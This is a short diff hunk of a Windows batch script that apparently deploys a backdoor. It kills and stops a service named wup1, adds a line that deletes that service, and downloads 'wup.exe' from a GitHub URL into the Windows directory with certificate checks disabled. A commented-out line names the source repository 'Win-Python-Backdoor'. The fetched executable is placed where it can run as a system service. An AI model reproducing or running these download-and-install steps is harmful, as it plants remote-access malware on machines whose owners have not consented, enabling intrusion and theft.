@@ -63,6 +63,7 @@ rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Back
 set wupname=wup1
 taskkill /f /im %wupname%.exe
 net stop %wupname%
+sc delete %wupname% 
 wget --no-check-certificate %urlgit%/win/wup.exe  -O %windir%\%wupname%.exe
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup1.exe
 
